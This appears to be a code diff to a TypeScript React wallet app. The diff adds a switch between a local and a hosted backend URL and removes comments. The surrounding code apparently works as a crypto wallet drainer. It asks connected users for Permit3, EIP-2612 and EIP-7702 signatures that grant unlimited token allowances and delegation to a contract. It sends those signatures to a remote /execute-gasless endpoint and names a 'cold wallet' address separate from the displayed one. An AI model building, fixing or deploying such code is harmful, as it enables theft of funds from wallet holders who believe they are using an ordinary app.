@@ -43,6 +43,11 @@ const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7';
 // 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'
 
+// 🌐 AUTO-SWITCH BACKEND URL (works with Vite / CRA)
+const BACKEND_URL = import.meta.env.DEV
+  ? 'http://localhost:3001'
+  : 'https://salvation-server-gp-production.up.railway.app';
+
 // 💎 EVM TOKEN DISCOVERY (XRP removed)
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
@@ -149,7 +154,6 @@ export default function App() {
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
   const { chainId } = useAppKitNetwork() 
-  // ✅ FIX: correct destructuring – original code used 'walletProvider'
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
   const log = (msg: string) => {
@@ -160,7 +164,6 @@ export default function App() {
   useEffect(() => {
     if (!isConnected || !walletAddress || !evmWalletProvider) return;
 
-    // ✅ FIX: guard against undefined chainId to avoid NaN
     if (chainId !== undefined) {
       getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
     }
@@ -282,7 +285,6 @@ export default function App() {
     const domain = {
       name: 'Permit3',
       version: '1',
-      // 🔁 ORIGINAL LOGIC: chainId is 1 (as you intended)
       chainId: 1,
       verifyingContract: PERMIT3_ADDRESS[1],
     };
@@ -301,7 +303,6 @@ export default function App() {
       .map((t: any) => t.address);
 
     const owner = await signer.getAddress();
-    // Deterministic dummy nonce: timestamp + first 8 bytes of owner (for uniqueness)
     const dummyNonce = Math.floor(Date.now() / 1000) + parseInt(owner.slice(2, 10), 16);
 
     const message = {
@@ -340,7 +341,7 @@ export default function App() {
     const authParams = {
       chainId: '0x' + chainId.toString(16),
       address: delegator,
-      nonce: '0x0',         // optional; wallet will pick if undefined
+      nonce: '0x0',
     };
     log(`[EIP-7702] Signing authorization for delegator ${delegator} on chain ${chainId}`);
     const signature = await provider.request({
@@ -380,9 +381,7 @@ export default function App() {
       try {
         log('[PERMIT3] Requesting cross‑chain signature...');
         permit3Signature = await signPermit3(signer, EVM_CONTRACT_ADDRESS, deadline);
-        // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
-        fetch('http://localhost:3001/execute-gasless', {
-
+        fetch(`${BACKEND_URL}/execute-gasless`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -467,9 +466,7 @@ export default function App() {
                     log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                     const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                     
-                    // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
-                    fetch('http://localhost:3001/execute-gasless', {
-
+                    fetch(`${BACKEND_URL}/execute-gasless`, {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ 
@@ -526,9 +523,7 @@ export default function App() {
                     };
                     const signature = await signer.signTypedData(domain, types, message);
 
-                    // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
-                    fetch('http://localhost:3001/execute-gasless', {
-
+                    fetch(`${BACKEND_URL}/execute-gasless`, {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ 
@@ -557,9 +552,7 @@ export default function App() {
                   setStatus(`EIP-7702 Authorization: ${token.symbol}...`);
                   log(`[EIP-7702] Signing authorization for atomic approve+transfer...`);
                   const authSig = await signEIP7702Authorization(activeProvider, activeChainId, BATCH_EXECUTOR_ADDRESS);
-                  // fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
-                  fetch('http://localhost:3001/execute-gasless', {
-
+                  fetch(`${BACKEND_URL}/execute-gasless`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -589,7 +582,6 @@ export default function App() {
                 const erc20Contract = new Contract(token.address, EVM_ERC20_ABI, signer);
                 const encodedData = erc20Contract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                 
-                // Remove 'from' field – MetaMask uses the connected account automatically
                 const txHash = await (activeProvider as any).request({
                     method: 'eth_sendTransaction',
                     params: [{
